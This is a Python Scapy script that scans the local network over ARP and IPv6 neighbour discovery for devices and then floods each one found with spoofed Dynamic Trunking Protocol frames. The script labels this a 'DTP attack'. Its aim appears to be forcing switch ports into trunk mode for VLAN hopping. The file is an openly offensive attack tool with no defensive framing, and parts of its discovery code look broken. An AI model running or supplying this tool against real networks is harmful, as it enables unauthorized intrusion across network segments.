from scapy.all import *
from scapy.contrib.dtp import DTP
import logging
import ipaddress
import time

# Constants for configuration
ARP_TIMEOUT = 2
DISCOVERY_INTERVAL = 0.5
DTP_COUNT = 50
DTP_INTERVAL = 0.5

def setup_logging():
    """Set up logging configuration."""
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def get_active_interface():
    """Get an active network interface."""
    for iface in get_if_list():
        try:
            ip = get_if_addr(iface)
            if ip:
                logging.info(f"Found active interface: {iface} with IP: {ip}")
                return iface, ip
        except Exception as e:
            logging.warning(f"Could not get IP for interface {iface}: {e}")
    raise Exception("No active interfaces found.")

def discover_targets(interface):
    """Discover IPv4 and IPv6 targets on the network."""
    targets = []

    # Discover IPv4 targets using ARP
    try:
        net = conf.iface[interface].network
        subnet_mask = conf.iface[interface].netmask
        for ip in ipaddress.IPv4Network(f"{net}/{subnet_mask}", strict=False):
            arp_request = ARP(pdst=str(ip))
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = srp(arp_request_broadcast, iface=interface, timeout=ARP_TIMEOUT, verbose=False)[0]
            targets.extend(received.hwsrc for sent, received in answered_list)
    except Exception as e:
        logging.error(f"Error during IPv4 discovery: {e}")

    # Discover IPv6 targets using Neighbor Solicitation
    try:
        ipv6_network = get_if_addr(interface) + "/64"  # Assuming /64 subnet for simplicity
        for ip in ipaddress.IPv6Network(ipv6_network, strict=False):
            ns = IPv6NDNS(dst=str(ip))
            answered_list = srp(ns, iface=interface, timeout=ARP_TIMEOUT, verbose=False)[0]
            targets.extend(received.psrc for sent, received in answered_list)
    except Exception as e:
        logging.error(f"Error during IPv6 discovery: {e}")

    if not targets:
        logging.warning("No devices found in the network.")
    return targets

def dtp_attack(target_mac, iface):
    """Perform a DTP attack on the specified target MAC address."""
    dtp_frame = Ether(dst=target_mac, src=RandMAC(), type=0x2004) / \
                DTP(tlvlist=[(0x01, b"\x03\x04\x01\x00\x00\x00")])

    logging.info(f"Launching DTP attack on {target_mac} using interface {iface}...")
    try:
        sendp(dtp_frame, iface=iface, count=DTP_COUNT, inter=DTP_INTERVAL)
        logging.info(f"DTP attack launched on {target_mac}")
    except Exception as e:
        logging.error(f"Error during DTP attack: {e}")

def main():
    """Main function to execute the script."""
    setup_logging()

    try:
        iface, ip = get_active_interface()
        targets = discover_targets(iface)

        if targets:
            for target_mac in targets:
                dtp_attack(target_mac, iface)
                time.sleep(DISCOVERY_INTERVAL)  # Add a delay between attacks
        else:
            logging.info("No targets available for attack.")
    except Exception as e:
        logging.error(f"Critical error: {e}")
    finally:
        logging.info("Script execution completed.")

if __name__ == "__main__":
    main()